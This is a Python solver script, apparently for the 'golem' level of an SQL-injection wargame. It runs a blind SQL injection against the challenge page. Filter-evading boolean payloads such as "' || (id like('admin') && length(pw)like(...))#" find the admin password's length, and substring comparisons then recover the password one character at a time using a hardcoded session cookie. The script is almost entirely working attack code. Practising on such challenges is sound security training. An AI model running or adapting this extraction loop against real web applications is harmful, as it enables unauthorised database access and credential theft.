import requests
import string
string.printable

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
cookies = {
    'PHPSESSID' : 'nui79padnqo9dshj9fl9m5ani3'
}
params = {
    'pw': None
}

for i in range(5,9):
    payload= "' || (id like('admin') && length(pw)like({}))# ".format(i)
    params['pw'] = payload
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello admin" in response.text):
        print(params)


answer = ''
for i in range(1,9):
    for j in string.printable:
        payload = "' || ( id like 'admin' && right(left(pw,{0}),1) like '{1}')#".format(i,j)
        params['pw'] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            answer +=j
            print(payload)
            break

print(answer)